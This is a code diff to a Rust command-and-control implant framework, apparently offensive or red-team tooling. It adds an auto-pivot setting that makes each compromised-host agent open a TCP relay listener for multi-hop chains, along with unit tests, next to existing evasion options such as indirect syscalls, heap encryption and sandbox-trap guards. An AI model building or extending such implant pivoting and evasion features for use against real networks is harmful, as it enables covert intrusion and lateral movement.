@@ -372,6 +372,32 @@ pub struct C2Config {
     /// that are not expected to be elevated and want to avoid sandbox traps.
     #[serde(default)]
     pub guard_no_system: bool,
+
+    // ── Pivot auto-cascade ────────────────────────────────────────────────────
+
+    /// When set, the agent automatically starts a TCP pivot listener on this
+    /// port immediately after a successful session handshake completes.
+    ///
+    /// Use this to pre-wire multi-hop chains at build time without requiring
+    /// the operator to manually issue pivot:listener_tcp on each intermediate
+    /// hop after it connects.
+    ///
+    /// Example 4-hop chain:
+    ///   hop1 agent: auto_pivot_port = None  (direct session; operator starts
+    ///               its listener manually with: pivot:listener_tcp 5001)
+    ///   hop2 agent: auto_pivot_port = Some(5002)  ← starts :5002 on connect
+    ///   hop3 agent: auto_pivot_port = Some(5003)  ← starts :5003 on connect
+    ///   hop4 agent: auto_pivot_port = None         ← leaf node, no downstream
+    ///
+    /// The listener starts in a detached background task immediately after the
+    /// handshake completes, so it is ready before downstream agents reach their
+    /// first reconnect attempt (assuming a reasonable initial_delay / retry
+    /// window in the downstream fallback profile).
+    ///
+    /// Leave as None (default) to disable — the check is a no-op and existing
+    /// configs need no changes.
+    #[serde(default)]
+    pub auto_pivot_port: Option<u16>,
 }
 
 // ... (Rest of common.rs remains the same: ClientHello, SecuredCommand, etc.)
@@ -571,6 +597,8 @@ mod tests {
         assert_eq!(config.guard_hour_start, 0);
         assert_eq!(config.guard_hour_end, 0);
         assert!(!config.guard_no_system);
+        // Pivot auto-cascade: disabled by default
+        assert!(config.auto_pivot_port.is_none());
     }
 
     #[test]
@@ -640,6 +668,32 @@ mod tests {
         // Other evasion fields still default to true
         assert!(config.indirect_syscalls);
         assert!(config.heap_encrypt);
+    }
+
+    #[test]
+    fn test_c2config_auto_pivot_port_set() {
+        let json = r#"{
+            "transport": "tcp_plain",
+            "server_public_key": "k", "hash_salt": "s", "c2_host": "10.0.0.1",
+            "build_id": "b", "tunnel_port": 5001, "sleep_interval": 5,
+            "jitter_min": 0, "jitter_max": 0,
+            "auto_pivot_port": 5002
+        }"#;
+        let config: C2Config = serde_json::from_str(json).unwrap();
+        assert_eq!(config.auto_pivot_port, Some(5002));
+    }
+
+    #[test]
+    fn test_c2config_auto_pivot_port_null_explicit() {
+        let json = r#"{
+            "transport": "tcp_plain",
+            "server_public_key": "k", "hash_salt": "s", "c2_host": "10.0.0.1",
+            "build_id": "b", "tunnel_port": 5001, "sleep_interval": 5,
+            "jitter_min": 0, "jitter_max": 0,
+            "auto_pivot_port": null
+        }"#;
+        let config: C2Config = serde_json::from_str(json).unwrap();
+        assert!(config.auto_pivot_port.is_none());
     }
 
     #[test]
